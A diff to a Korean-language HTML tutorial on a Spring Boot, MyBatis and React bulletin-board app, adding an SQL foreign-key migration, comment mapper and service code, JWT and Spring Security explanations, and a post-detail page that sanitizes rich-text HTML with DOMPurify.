@@ -1229,6 +1229,66 @@ LEFT JOIN board_content_hate bch ON bch.bno = b.bno;</code></pre>
       <div class="box alt"><div class="bt">🔄 대안</div>
         <p>View 대신 MyBatis XML에 JOIN·집계를 직접 쓰거나, JPA에서 <code>@Query</code>로 네이티브 SQL을 작성할 수도 있습니다. 팀에서 SQL 가독성과 재사용성 중 무엇을 우선할지 정하면 됩니다.</p>
       </div>
+
+      <h3>board-fk-migration.sql (기존 DB 마이그레이션용)</h3>
+      <div class="box tip"><div class="bt">💡 신규 DB vs 기존 DB</div>
+        <p>처음부터 <code>board.sql</code>을 실행하면 FK가 포함됩니다. 수업 이전 버전의 DB를 이미 사용 중이라면 이 파일로 FK와 UNIQUE 제약을 추가합니다. 두 번 실행해도 괜찮도록 <code>DROP ... IF EXISTS</code>를 먼저 실행합니다.</p>
+      </div>
+      <div class="codecap">board-fk-migration.sql</div>
+      <pre><code class="language-sql">-- ① 게시글 삭제 시 댓글 자동 삭제 (CASCADE)
+ALTER TABLE board_comment
+  DROP FOREIGN KEY IF EXISTS FK_board_TO_board_comment;
+ALTER TABLE board_comment
+  ADD CONSTRAINT FK_board_TO_board_comment
+    FOREIGN KEY (bno) REFERENCES board(bno) ON DELETE CASCADE;
+
+-- ② 게시글 삭제 시 반응 자동 삭제 + 중복 반응 방지 (UNIQUE)
+ALTER TABLE board_reaction
+  DROP FOREIGN KEY IF EXISTS FK_board_TO_board_reaction;
+ALTER TABLE board_reaction
+  ADD CONSTRAINT FK_board_TO_board_reaction
+    FOREIGN KEY (bno) REFERENCES board(bno) ON DELETE CASCADE;
+-- UNIQUE 제약: 같은 사람이 같은 게시글에 반응 1개만 허용
+ALTER TABLE board_reaction
+  ADD CONSTRAINT UNIQUE (mid, bno);
+
+-- ③ 댓글 삭제 시 댓글 반응 자동 삭제 + 중복 반응 방지
+ALTER TABLE board_comment_reaction
+  DROP FOREIGN KEY IF EXISTS FK_comment_TO_reaction;
+ALTER TABLE board_comment_reaction
+  ADD CONSTRAINT FK_comment_TO_reaction
+    FOREIGN KEY (cno) REFERENCES board_comment(cno) ON DELETE CASCADE;
+ALTER TABLE board_comment_reaction
+  ADD CONSTRAINT UNIQUE (mid, cno);
+
+-- ④ 회원 삭제 시 Refresh Token 자동 삭제
+ALTER TABLE refresh_tokens
+  DROP FOREIGN KEY IF EXISTS FK_member_TO_refresh;
+ALTER TABLE refresh_tokens
+  ADD CONSTRAINT FK_member_TO_refresh
+    FOREIGN KEY (user_id) REFERENCES board_member(id) ON DELETE CASCADE;</code></pre>
+      <div class="box warn"><div class="bt">⚠️ IF EXISTS — MySQL 8.0.2+</div>
+        <p><code>DROP FOREIGN KEY IF EXISTS</code>는 MySQL 8.0.2 이상에서 지원합니다. 낮은 버전이라면 <code>SHOW CREATE TABLE board_comment;</code>로 FK 이름을 확인하고 직접 지정하세요. 이미 같은 UNIQUE 인덱스가 있으면 오류가 날 수 있으므로 <code>SHOW INDEX FROM board_reaction;</code>로 미리 확인하세요.</p>
+      </div>
+      <div class="box logic"><div class="bt">🟢 board_comment_view (댓글 집계 뷰)</div>
+        <p>댓글 반응(좋아요/싫어요)까지 한 번에 조회하려면 <code>board_view</code>와 동일한 패턴으로 댓글 뷰를 만들 수 있습니다.</p>
+        <pre><code class="language-sql">CREATE OR REPLACE VIEW board_comment_view AS
+WITH comment_like AS (
+  SELECT cno, count(*) AS clike FROM board_comment_reaction WHERE type='like' GROUP BY cno
+),
+comment_hate AS (
+  SELECT cno, count(*) AS chate FROM board_comment_reaction WHERE type='dislike' GROUP BY cno
+)
+SELECT
+  bc.cno, bc.bno, bc.content, bc.cdate, bc.mid,
+  bm.nickname,
+  IFNULL(cl.clike, 0) AS clike,
+  IFNULL(ch.chate, 0) AS chate
+FROM board_comment bc
+LEFT JOIN board_member bm ON bc.mid = bm.id
+LEFT JOIN comment_like cl ON cl.cno = bc.cno
+LEFT JOIN comment_hate ch ON ch.cno = bc.cno;</code></pre>
+      </div>
     </section>
 
     <!-- ===== 07 ===== -->
@@ -1311,17 +1371,51 @@ LEFT JOIN board_content_hate bch ON bch.bno = b.bno;</code></pre>
       <div class="box tip"><div class="bt">💡 useGeneratedKeys 동작 원리</div>
         <p><code>INSERT</code> 후 MySQL이 자동으로 채운 <code>AUTO_INCREMENT</code> 값(bno)을 Java 객체의 <code>bno</code> 필드에 세팅해줍니다. 덕분에 <code>addBoard(board)</code> 실행 후 <code>board.getBno()</code>로 새 글번호를 바로 읽을 수 있습니다.</p>
       </div>
-      <h4>board-comment-mapper.xml (댓글)</h4>
+      <h4>board-comment-mapper.xml (댓글 — 전체)</h4>
       <pre><code class="language-xml">&lt;mapper namespace="com.spring.mapper.BoardCommentMapper"&gt;
+
+  &lt;!-- 댓글 등록 --&gt;
   &lt;insert id="insertBoardComment"&gt;
     INSERT INTO board_comment (bno, mid, content)
     VALUES (#{bno}, #{mid}, #{content})
   &lt;/insert&gt;
 
+  &lt;!-- 댓글 수정 --&gt;
+  &lt;update id="updateBoardComment"&gt;
+    UPDATE board_comment SET content = #{content} WHERE cno = #{cno}
+  &lt;/update&gt;
+
+  &lt;!-- 댓글 삭제 (cno 기준) --&gt;
+  &lt;delete id="deleteBoardComment"&gt;
+    DELETE FROM board_comment WHERE cno = #{cno}
+  &lt;/delete&gt;
+
+  &lt;!-- 게시글 삭제 시 해당 글의 댓글 전체 삭제 (CASCADE 없는 경우 수동 처리) --&gt;
+  &lt;delete id="deleteBoardCommentByBno"&gt;
+    DELETE FROM board_comment WHERE bno = #{bno}
+  &lt;/delete&gt;
+
+  &lt;!-- 댓글 반응 조회 --&gt;
   &lt;select id="selectBoardCommentReaction" resultType="boardCommentReq"&gt;
     SELECT * FROM board_comment_reaction WHERE mid = #{id} AND cno = #{cno}
   &lt;/select&gt;
 
+  &lt;!-- 댓글 반응 등록 --&gt;
+  &lt;insert id="insertBoardCommentReaction"&gt;
+    INSERT INTO board_comment_reaction (mid, cno, type) VALUES (#{mid}, #{cno}, #{type})
+  &lt;/insert&gt;
+
+  &lt;!-- 댓글 반응 수정 (like ↔ dislike) --&gt;
+  &lt;update id="updateBoardCommentReaction"&gt;
+    UPDATE board_comment_reaction SET type = #{type} WHERE id = #{id}
+  &lt;/update&gt;
+
+  &lt;!-- 댓글 반응 삭제 (취소) --&gt;
+  &lt;delete id="deleteBoardCommentReaction"&gt;
+    DELETE FROM board_comment_reaction WHERE id = #{id}
+  &lt;/delete&gt;
+
+  &lt;!-- 댓글 반응 집계 --&gt;
   &lt;select id="selectBoardCommentReactionCount" resultType="reaction"&gt;
     SELECT
       COUNT(CASE WHEN br.type = 'like' THEN 1 END) AS likeCount,
@@ -1330,7 +1424,36 @@ LEFT JOIN board_content_hate bch ON bch.bno = b.bno;</code></pre>
     LEFT OUTER JOIN board_comment_reaction br ON b.cno = br.cno
     WHERE b.cno = #{cno}
   &lt;/select&gt;
+
 &lt;/mapper&gt;</code></pre>
+      <div class="box warn"><div class="bt">⚠️ deleteBoardCommentByBno — FK CASCADE가 있으면 불필요</div>
+        <p><code>board_comment</code>에 <code>ON DELETE CASCADE</code> FK가 설정되어 있으면 게시글 삭제 시 댓글이 DB 레벨에서 자동 삭제됩니다. FK가 없는 환경이라면 게시글 삭제 Service에서 <code>deleteBoardCommentByBno(bno)</code>를 먼저 호출해야 합니다.</p>
+      </div>
+
+      <h3>BoardCommentMapper.java 인터페이스</h3>
+      <div class="box basic"><div class="bt">📘 Mapper 인터페이스 — XML과 1:1 대응</div>
+        <p>XML의 <code>id</code>와 Java 메서드 이름이 완전히 같아야 합니다. 파라미터가 2개 이상이면 <code>@Param</code>으로 이름을 명시합니다.</p>
+      </div>
+      <pre><code class="language-java">@Mapper
+public interface BoardCommentMapper {
+    // CRUD
+    void insertBoardComment(BoardCommentDTO comment);
+    void updateBoardComment(BoardCommentDTO comment);   // comment.cno + comment.content
+    void deleteBoardComment(int cno);
+    void deleteBoardCommentByBno(int bno);              // 게시글 삭제 연동 (FK 없는 경우)
+
+    // 댓글 반응 (토글 3가지 경우)
+    BoardCommentReactionReq selectBoardCommentReaction(
+        @Param("cno") int cno,
+        @Param("id") Long id);
+    void insertBoardCommentReaction(BoardCommentReactionReq req);
+    void updateBoardCommentReaction(BoardCommentReactionReq req);
+    void deleteBoardCommentReaction(int id);
+    ReactionCountDTO selectBoardCommentReactionCount(int cno);
+}</code></pre>
+      <div class="box tip"><div class="bt">💡 @Param 사용 규칙</div>
+        <p>파라미터가 1개면 <code>@Param</code> 생략 가능. 2개 이상이면 반드시 필요합니다. XML에서 <code>#{cno}</code>, <code>#{id}</code>로 매핑됩니다. 파라미터가 객체(DTO)이면 객체 필드를 <code>#{fieldName}</code>으로 직접 사용합니다.</p>
+      </div>
     </section>
 
     <!-- ===== 08 ===== -->
@@ -1558,6 +1681,28 @@ public class JwtTokenProvider {
 
     public String getUsername(String token) { return parseClaims(token).getSubject(); }
 }</code></pre>
+      <div class="box basic"><div class="bt">📘 Claims란? — 토큰에 담는 데이터 조각들</div>
+        <p>JWT Payload에 저장하는 key-value 데이터를 <strong>Claim(클레임)</strong>이라고 합니다. 표준 Claim과 커스텀 Claim이 있습니다.</p>
+        <div class="tablewrap"><table>
+          <thead><tr><th>메서드</th><th>Claim 이름</th><th>값 예시</th><th>설명</th></tr></thead>
+          <tbody>
+            <tr><td><code>.subject("user1")</code></td><td><code>sub</code></td><td><code>"user1"</code></td><td>표준 Claim — 토큰 주체 (보통 username)</td></tr>
+            <tr><td><code>.claim("role", "ROLE_USER")</code></td><td><code>role</code></td><td><code>"ROLE_USER"</code></td><td>커스텀 Claim — 권한 정보</td></tr>
+            <tr><td><code>.issuedAt(new Date())</code></td><td><code>iat</code></td><td><code>1719600000</code></td><td>표준 Claim — 발급 시각(Unix timestamp)</td></tr>
+            <tr><td><code>.expiration(new Date(...))</code></td><td><code>exp</code></td><td><code>1719601800</code></td><td>표준 Claim — 만료 시각</td></tr>
+          </tbody>
+        </table></div>
+        <p><code>parseClaims(token)</code>으로 꺼내면 이 key-value들을 Map처럼 읽을 수 있습니다. <code>getSubject()</code> → username 반환, <code>.get("role")</code> → 권한 반환.</p>
+      </div>
+      <div class="box tip"><div class="bt">💡 HMAC-SHA256이란? — 위변조 방지 서명</div>
+        <p><code>Keys.hmacShaKeyFor(secret.getBytes())</code>로 비밀키를 만들고 <code>.signWith(key)</code>로 토큰에 서명합니다.</p>
+        <ul class="tick">
+          <li><strong>HMAC</strong>: 비밀키 + 메시지를 합쳐 해시하는 방식 (MAC = Message Authentication Code)</li>
+          <li><strong>SHA-256</strong>: 256비트(32바이트) 해시 알고리즘 — 빠르고 안전</li>
+          <li>서버만 비밀키를 알고 있으므로, 클라이언트가 토큰 내용을 바꾸면 서명 검증 실패 → <code>JwtException</code></li>
+          <li><code>validateToken()</code>이 <code>false</code>를 반환하면 필터에서 인증 정보를 설정하지 않아 401 응답</li>
+        </ul>
+      </div>
       <div class="box logic"><div class="bt">🟢 로그인 시 토큰 발급 흐름</div>
         <div class="flow">클라이언트 → POST /auth/login { username, password }
   → AuthController.login()
@@ -1615,8 +1760,23 @@ public class JwtAuthenticationFilter extends OncePerRequestFilter {
         filterChain.doFilter(request, response);  // 다음 필터로 전달
     }
 }</code></pre>
+      <div class="box logic"><div class="bt">🟢 SecurityContextHolder — "이 요청의 로그인 사용자"를 저장하는 곳</div>
+        <p><code>SecurityContextHolder.getContext().setAuthentication(auth)</code>는 현재 요청 스레드에 "이 사람이 인증됐다"는 정보를 등록합니다.</p>
+        <ul class="tick">
+          <li>Controller에서 <code>@AuthenticationPrincipal UserDetails u</code>로 꺼낼 수 있는 근거가 여기입니다</li>
+          <li><code>UsernamePasswordAuthenticationToken(userDetails, null, authorities)</code> — 두 번째 인자(<code>credentials</code>)는 인증 후엔 null로 줘도 됩니다 (비밀번호 노출 방지)</li>
+          <li>세 번째 인자 <code>authorities</code>를 줘야 <code>hasRole("USER")</code> 같은 권한 체크가 통과됩니다</li>
+          <li>필터가 끝나면 요청 스레드와 함께 SecurityContext도 사라집니다 (STATELESS 설정의 의미)</li>
+        </ul>
+        <pre style="margin-top:8px"><code class="language-java">// SecurityContextHolder에 등록 후 Controller가 사용하는 방법
+@GetMapping("/me")
+public ResponseEntity&lt;?&gt; getMe(@AuthenticationPrincipal UserDetails userDetails) {
+    // userDetails = 필터에서 등록한 정보가 그대로 전달됨
+    return ResponseEntity.ok(userDetails.getUsername());
+}</code></pre>
+      </div>
       <div class="box tip"><div class="bt">💡 OncePerRequestFilter란</div>
-        <p>한 요청당 딱 한 번만 실행되는 필터 기반 클래스입니다. Spring 내부에서 같은 요청이 여러 번 필터를 거치는 경우를 방지합니다.</p>
+        <p>한 요청당 딱 한 번만 실행되는 필터 기반 클래스입니다. Spring 내부에서 포워드(forward)나 include 등으로 같은 요청이 필터를 여러 번 통과하는 상황을 자동으로 막아줍니다.</p>
       </div>
     </section>
 
@@ -1710,6 +1870,48 @@ public interface BoardMapper {
     void updateBoardReaction(BoardReactionReq req);
     ReactionCountDTO selectBoardReactionCount(int bno);
 }</code></pre>
+      <h3>BoardService.java</h3>
+      <pre><code class="language-java">@Service
+@RequiredArgsConstructor
+public class BoardService {
+    private final BoardMapper boardMapper;
+
+    public List&lt;BoardDTO&gt; getBoardList(int page, int size) {
+        return boardMapper.selectBoardList(page, size);
+    }
+    public List&lt;BoardDTO&gt; searchBoardList(String keyword, int page, int size) {
+        return boardMapper.searchBoardList(keyword, page, size);
+    }
+    public int boardCount() { return boardMapper.boardCount(); }
+
+    public BoardDTO selectBoard(int bno) { return boardMapper.selectBoard(bno); }
+    public List&lt;BoardCommentDTO&gt; selectBoardComment(int bno) {
+        return boardMapper.selectBoardComment(bno);
+    }
+
+    public void addBoard(BoardDTO board)  { boardMapper.insertBoard(board); }
+    public void updateBoard(BoardDTO board) { boardMapper.updateBoard(board); }
+    @Transactional
+    public void deleteBoard(int bno) {
+        // FK CASCADE가 없으면 댓글 먼저 삭제 후 게시글 삭제
+        // boardCommentMapper.deleteBoardCommentByBno(bno);
+        boardMapper.deleteBoard(bno);
+    }
+
+    public BoardReactionReq selectBoardReaction(int bno, Long id) {
+        return boardMapper.selectBoardReaction(bno, id);
+    }
+    public void addBoardReaction(BoardReactionReq req) { boardMapper.insertBoardReaction(req); }
+    public void deleteBoardReaction(BoardReactionReq req) { boardMapper.deleteBoardReaction(req); }
+    public void updateBoardReaction(BoardReactionReq req) { boardMapper.updateBoardReaction(req); }
+    public ReactionCountDTO getBoardReactionCount(int bno) {
+        return boardMapper.selectBoardReactionCount(bno);
+    }
+}</code></pre>
+      <div class="box basic"><div class="bt">📘 Service가 단순 위임처럼 보이는 이유</div>
+        <p>지금은 Mapper 메서드를 그대로 위임하는 것처럼 보이지만, Service 계층이 있어야 <strong>트랜잭션 관리</strong>(<code>@Transactional</code>), 권한 검증, 알림 발송 같은 비즈니스 규칙을 Controller와 분리해 추가할 수 있습니다. Controller가 직접 Mapper를 호출하면 이런 규칙을 붙이기 어렵습니다.</p>
+      </div>
+
       <h3>BoardController — REST API 엔드포인트</h3>
       <pre><code class="language-java">@RestController
 @RequestMapping("/api/posts")
@@ -1740,6 +1942,15 @@ public class BoardController {
         board.setMid(entity.getId());
         boardService.addBoard(board);   // insertBoard 후 board.bno 자동 설정
         return ResponseEntity.ok(Map.of("board", board));
+    }
+
+    // GET /api/posts/{bno} → 게시글 상세 + 댓글 목록 (로그인 불필요)
+    @GetMapping("/{bno}")
+    public ResponseEntity&lt;Map&lt;String,Object&gt;&gt; getBoard(@PathVariable int bno) {
+        BoardDTO board = boardService.selectBoard(bno);
+        if (board == null) return ResponseEntity.notFound().build();
+        List&lt;BoardCommentDTO&gt; commentList = boardService.selectBoardComment(bno);
+        return ResponseEntity.ok(Map.of("board", board, "commentList", commentList));
     }
 
     // DELETE /api/posts/{bno} → 작성자 본인만 가능
@@ -1798,6 +2009,52 @@ public class BoardController {
     <!-- ===== 14 ===== -->
     <section class="doc" id="s14">
       <div class="sec-head"><span class="idx">14</span><h2>댓글 CRUD (BoardCommentController)</h2></div>
+
+      <h3>BoardCommentService.java</h3>
+      <pre><code class="language-java">@Service
+@RequiredArgsConstructor
+public class BoardCommentService {
+    private final BoardCommentMapper boardCommentMapper;
+
+    public void insertBoardComment(BoardCommentDTO comment) {
+        boardCommentMapper.insertBoardComment(comment);
+    }
+    public void updateBoardComment(BoardCommentDTO comment) {
+        boardCommentMapper.updateBoardComment(comment);
+    }
+    public void deleteBoardComment(int cno) {
+        boardCommentMapper.deleteBoardComment(cno);
+    }
+
+    // 반응 토글 3가지 경우
+    public BoardCommentReactionReq selectBoardCommentReaction(int cno, Long id) {
+        return boardCommentMapper.selectBoardCommentReaction(cno, id);
+    }
+    public void insertBoardCommentReaction(BoardCommentReactionReq req) {
+        boardCommentMapper.insertBoardCommentReaction(req);
+    }
+    public void updateBoardCommentReaction(BoardCommentReactionReq req) {
+        boardCommentMapper.updateBoardCommentReaction(req);
+    }
+    public void deleteBoardCommentReaction(int id) {
+        boardCommentMapper.deleteBoardCommentReaction(id);
+    }
+    public ReactionCountDTO selectBoardCommentReactionCount(int cno) {
+        return boardCommentMapper.selectBoardCommentReactionCount(cno);
+    }
+}</code></pre>
+      <div class="box logic"><div class="bt">🟢 게시글 Service vs 댓글 Service 패턴 비교</div>
+        <div class="tablewrap"><table>
+          <tr><th>비교 항목</th><th>BoardService</th><th>BoardCommentService</th></tr>
+          <tr><td>Mapper 주입</td><td><code>BoardMapper</code></td><td><code>BoardCommentMapper</code></td></tr>
+          <tr><td>조회 기준</td><td><code>bno</code> (게시글 번호)</td><td><code>cno</code> (댓글 번호)</td></tr>
+          <tr><td>반응 테이블</td><td><code>board_reaction</code></td><td><code>board_comment_reaction</code></td></tr>
+          <tr><td>토글 로직</td><td>Controller에 위치</td><td>Controller에 위치</td></tr>
+        </table></div>
+        <p>패턴이 완전히 동일합니다. 게시글 CRUD를 이해하면 댓글도 같은 방식으로 읽으면 됩니다.</p>
+      </div>
+
+      <h3>BoardCommentController.java</h3>
       <pre><code class="language-java">@RestController
 @RequestMapping("/api/comments")
 @RequiredArgsConstructor
@@ -2289,6 +2546,25 @@ export default () => {
         <tr><td><code>quillInstance</code></td><td>Quill 인스턴스 보관</td><td>리렌더링해도 인스턴스가 사라지지 않게</td></tr>
         <tr><td><code>onChangeRef</code></td><td>최신 onChange 함수 참조</td><td>클로저 문제 방지 (오래된 함수 참조 방지)</td></tr>
       </table></div>
+      <div class="box warn"><div class="bt">⚠️ 클로저 문제란? — onChangeRef가 필요한 이유</div>
+        <p><code>useEffect(()=>{...}, [])</code>는 마운트 시 딱 한 번 실행됩니다. 이 때 콜백 내부에서 <code>onChange</code>를 직접 참조하면, <code>onChange</code>가 나중에 부모에서 새로운 함수로 바뀌어도 최초 마운트 시의 옛날 함수를 계속 보게 됩니다. 이것이 <strong>클로저 문제(stale closure)</strong>입니다.</p>
+        <pre style="margin-top:8px"><code class="language-jsx">// ❌ 클로저 문제 — useEffect 내부에서 onChange를 직접 참조
+useEffect(() => {
+  quill.on("text-change", () => {
+    onChange(quill.getSemanticHTML());  // 마운트 시점의 onChange만 봄 (stale)
+  });
+}, []);  // 의존성 배열이 비어 있으면 onChange가 바뀌어도 재실행 안 함
+
+// ✅ onChangeRef 패턴 — 리렌더링마다 .current를 최신 함수로 교체
+onChangeRef.current = onChange;  // 컴포넌트 바디에서 매 렌더마다 실행
+
+useEffect(() => {
+  quill.on("text-change", () => {
+    onChangeRef.current(quill.getSemanticHTML());  // 항상 최신 onChange 호출
+  });
+}, []);  // Quill 인스턴스는 1회만 생성, 하지만 함수는 항상 최신 버전</code></pre>
+        <p><code>useRef</code>의 <code>.current</code>는 변경해도 리렌더링을 유발하지 않습니다. 따라서 매 렌더마다 <code>onChangeRef.current = onChange</code>로 업데이트해도 성능 문제가 없습니다.</p>
+      </div>
       <pre><code class="language-jsx">export default ({ onChange, defaultValue }) => {
   const editorRef = useRef(null);
   const quillInstance = useRef(null);
@@ -2396,74 +2672,243 @@ export default () => {
       <div class="sec-head"><span class="idx">26</span><h2>게시글 상세 페이지 (PostDetailPage)</h2></div>
       <div class="box basic"><div class="bt">📘 주요 기능</div>
         <ul class="tick">
-          <li><code>useParams()</code>로 URL에서 bno 추출</li>
-          <li><code>dangerouslySetInnerHTML</code>로 Quill HTML 렌더링</li>
-          <li>좋아요/싫어요 토글 후 서버 응답으로 UI 즉시 갱신</li>
-          <li>본인 글만 수정/삭제 버튼 표시 (<code>isEdit</code>)</li>
+          <li><code>useParams()</code>로 URL에서 <code>bno</code> 추출 → <code>/posts/5</code> 접속 시 <code>bno = "5"</code></li>
+          <li><code>useState(null)</code>로 초기화 → 데이터 로딩 전 로딩 메시지 표시 (null = 아직 데이터 없음)</li>
+          <li><code>postApi.getPost(bno)</code>로 게시글 + 댓글 배열을 한 번에 조회</li>
+          <li><code>import DOMPurify</code> + <code>dangerouslySetInnerHTML</code>로 Quill HTML을 XSS 방어하며 렌더링</li>
+          <li>좋아요/싫어요 토글 후 서버 응답 count로 화면 숫자 즉시 갱신 (<code>...prev</code> 스프레드)</li>
+          <li><code>isEdit</code>: 로그인 사용자 ID와 게시글 작성자 ID가 같을 때만 수정/삭제 버튼 표시</li>
+          <li>로그인 여부(<code>user</code>)에 따라 댓글 입력폼 vs 로그인 안내 분기</li>
+          <li>댓글 목록 <code>key={item.cno || index}</code> 패턴으로 안전한 렌더링</li>
         </ul>
       </div>
-      <pre><code class="language-jsx">export default () => {
-  const { bno } = useParams();          // URL /posts/5 → bno = "5"
-  const [post, setPost] = useState({});
+
+      <pre><code class="language-jsx">// ① 필요한 훅과 라이브러리 import
+import { useEffect, useState } from "react";
+import { useParams, useNavigate } from "react-router-dom";
+import { postApi } from "../api/postApi";
+import "quill/dist/quill.snow.css";   // 에디터 없어도 ql-container 스타일 유지용
+import { useAuth } from "../context/AuthContext";
+import DOMPurify from "dompurify";    // XSS 방어 라이브러리 (npm i dompurify)
+
+const PostDetailPage = () => {
+  const { bno } = useParams();             // URL /posts/5 → bno = "5"
+  const [post, setPost] = useState(null);  // ② null = 아직 서버 데이터 없음
   const [commentList, setCommentList] = useState([]);
-  const { user } = useAuth();
+  const { user } = useAuth();              // 전역 로그인 정보 (AuthContext)
   const navigate = useNavigate();
 
+  // ③ 컴포넌트 마운트 시 게시글 + 댓글 동시 조회
   useEffect(() => {
-    postApi.getPost(bno).then(res => {
-      setPost(res.data.board);
-      setCommentList(res.data.commentList);
+    postApi.getPost(bno).then(reponse => {       // .then() 체이닝 방식
+      setPost(reponse.data.board);               // 서버 응답의 board 객체로 갱신
+      setCommentList(reponse.data.commentList);  // 댓글 배열 갱신
+    }).catch(error => {
+      console.log(error);
     });
-  }, [bno]);
+  }, [bno]);  // bno가 바뀔 때마다 재실행 (URL 변경 시 새 게시글 로드)
 
-  // 좋아요/싫어요 토글
-  const handleReaction = async (type) => {
-    const res = await postApi.postReaction({ mid: user.id, bno: post.bno, type });
-    setPost(prev => ({
-      ...prev,
-      blike: res.data.count.likeCount,      // 서버가 준 최신 카운트로 갱신
-      bhate: res.data.count.dislikeCount
-    }));
-  };
-
-  // 삭제 (본인만)
+  // ④ 삭제 처리 — 서버가 권한 없으면 403 반환
   const handleDelete = async () => {
-    if (!window.confirm('삭제하시겠습니까?')) return;
-    try {
-      await postApi.remove(bno);
-      navigate('/');
-    } catch (error) {
-      if (error.response.status === 403) alert('삭제 권한이 없습니다.');
+    if (window.confirm('삭제하시겠습니까?')) {  // true(확인) / false(취소) 반환
+      try {
+        await postApi.remove(bno);
+        navigate('/');   // 삭제 성공 → 목록으로 이동
+      } catch (error) {
+        if (error.response.status === 403) {
+          alert('삭제 권한이 없습니다.');  // 403: 다른 사람 글 삭제 시도
+        } else {
+          alert('삭제에 실패했습니다.');
+        }
+      }
+    } else {
+      return;  // 취소 클릭 시 아무것도 안 함
     }
-  };
+  }
 
-  const isEdit = user && (user.id === post.mid);  // 본인 글 여부
+  // ⑤ 좋아요/싫어요 토글 — 서버 응답 count로 화면 갱신
+  const handleReaction = async (type) => {
+    await postApi.postReaction({ mid: user.id, bno: post.bno, type: type })
+      .then(res => {
+        setPost(prev => ({
+          ...prev,                              // 기존 post 필드 모두 유지
+          blike: res.data.count.likeCount,      // 좋아요 카운트만 교체
+          bhate: res.data.count.dislikeCount    // 싫어요 카운트만 교체
+        }));
+      })
+      .catch(error => {
+        console.log(error);
+      });
+  }
 
-  return &lt;div&gt;
-    &lt;h2&gt;{post.title}&lt;/h2&gt;
+  // ⑥ 수정/삭제 버튼 표시 여부 — 단계적 && 단락 평가로 null 에러 방지
+  const isEdit = user && post && (user.id === post.mid);
+  //             ↑로그인?  ↑데이터 있음?   ↑작성자 일치?
 
-    {/* Quill HTML 렌더링 — ql-container 클래스로 Quill 스타일 적용 */}
-    &lt;div className="ql-container ql-snow" style={{ border: 'none' }}&gt;
-      &lt;div dangerouslySetInnerHTML={{ __html: post.content }}&gt;&lt;/div&gt;
-    &lt;/div&gt;
-
-    &lt;button onClick={() =&gt; handleReaction('like')}&gt;👍 {post.blike}&lt;/button&gt;
-    &lt;button onClick={() =&gt; handleReaction('dislike')}&gt;👎 {post.bhate ?? 0}&lt;/button&gt;
-
-    {isEdit &amp;&amp; (
+  return &lt;div className="post-detail-container"&gt;
+    {/* ⑦ post가 null이면 로딩 메시지, 데이터 도착 후 본문 렌더링 */}
+    {!post ? &lt;div className="post-loading"&gt;현재 게시글 읽어오고 있습니다.&lt;/div&gt; :
       &lt;&gt;
-        &lt;button onClick={() =&gt; navigate(`/posts/${post.bno}/edit`)}&gt;수정&lt;/button&gt;
-        &lt;button onClick={handleDelete}&gt;삭제&lt;/button&gt;
+        &lt;h2 className="post-detail-title"&gt;{post.title}&lt;/h2&gt;
+
+        {/* 작성자/조회수/날짜 메타 정보 */}
+        &lt;div className="post-detail-meta"&gt;
+          &lt;span&gt;작성자: {post.nickname}&lt;/span&gt;
+          &lt;span&gt;조회수: {post.bcount}&lt;/span&gt;
+          &lt;span&gt;작성일: {post.writeUpdateDate}&lt;/span&gt;
+        &lt;/div&gt;
+
+        {/* ⑧ Quill HTML 렌더링 — DOMPurify로 XSS 정화 후 출력 */}
+        &lt;div className="ql-container ql-snow" style={{ border: 'none' }}&gt;
+          &lt;div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}&gt;&lt;/div&gt;
+        &lt;/div&gt;
+
+        {/* ⑨ 좋아요/싫어요 버튼 */}
+        &lt;button onClick={() =&gt; handleReaction('like')}&gt;좋아요 👍 {post.blike}&lt;/button&gt;
+        &lt;button onClick={() =&gt; handleReaction('dislike')}&gt;싫어요 👎 {post.bhate ? post.bhate : 0}&lt;/button&gt;
+        {/*                                                               null/0이면 0 표시 ↑ */}
+
+        {/* ⑩ 수정/삭제 — isEdit이 true일 때만 렌더링 */}
+        {isEdit &amp;&amp; (
+          &lt;div&gt;
+            &lt;button onClick={() =&gt; navigate(`/posts/${post.bno}/edit`)}&gt;수정&lt;/button&gt;
+            &lt;button onClick={handleDelete}&gt;삭제&lt;/button&gt;
+          &lt;/div&gt;
+        )}
+
+        {/* ⑪ 댓글 섹션 */}
+        &lt;div className="comment-section"&gt;
+          &lt;h3&gt;댓글 목록 ({commentList ? commentList.length : 0}개)&lt;/h3&gt;
+
+          {/* 로그인 여부에 따라 입력폼 / 로그인 안내 분기 */}
+          {user ?
+            &lt;div className="comment-form"&gt;
+              &lt;textarea placeholder="댓글을 입력해 주세요."&gt;&lt;/textarea&gt;
+              &lt;button&gt;댓글 등록&lt;/button&gt;  {/* TODO: API 미연결 */}
+            &lt;/div&gt;
+            :
+            &lt;div&gt;
+              댓글을 작성하시려면 로그인하세요
+              &lt;button onClick={() =&gt; navigate('/login')}&gt;로그인&lt;/button&gt;
+            &lt;/div&gt;
+          }
+
+          {/* ⑫ 댓글 목록 렌더링 */}
+          &lt;div className="comment-list"&gt;
+            {commentList &amp;&amp; commentList.map((item, index) =&gt;
+              &lt;div key={item.cno || index}&gt;  {/* cno 없으면 index로 fallback */}
+                &lt;span&gt;👤 {item.nickname}&lt;/span&gt;
+                &lt;span&gt;📅 {item.cdate}&lt;/span&gt;
+                &lt;div className="comment-content"&gt;{item.content}&lt;/div&gt;
+                &lt;button&gt;좋아요 👍&lt;/button&gt;  {/* TODO: 미연결 */}
+                &lt;button&gt;싫어요 👎&lt;/button&gt;  {/* TODO: 미연결 */}
+                &lt;button&gt;수정&lt;/button&gt;        {/* TODO: 미연결 */}
+                &lt;button&gt;삭제&lt;/button&gt;        {/* TODO: 미연결 */}
+              &lt;/div&gt;
+            )}
+          &lt;/div&gt;
+        &lt;/div&gt;
       &lt;/&gt;
-    )}
-    {/* 댓글 목록 ... */}
-  &lt;/div&gt;;
-}</code></pre>
-      <div class="box warn"><div class="bt">⚠️ dangerouslySetInnerHTML 주의</div>
-        <p>사용자가 입력한 HTML을 그대로 렌더링하면 <strong>XSS(크로스 사이트 스크립팅)</strong> 공격에 취약합니다. Quill이 생성한 HTML은 안전하지만, 실제 서비스에서는 DOMPurify 같은 라이브러리로 HTML을 정화하는 것을 권장합니다.</p>
+    }
+  &lt;/div&gt;
+}
+
+export default PostDetailPage;</code></pre>
+
+      <div class="box warn"><div class="bt">⚠️ useState(null) vs useState({}) — 로딩 상태 구분</div>
+        <p><code>useState({})</code>로 초기화하면 데이터 로드 전에도 <code>post.title</code>은 <code>undefined</code>로 조용히 렌더링됩니다. 반면 <code>useState(null)</code>이면 <code>!post</code>로 "아직 없음"을 명확히 잡아 로딩 메시지를 보여줄 수 있습니다.</p>
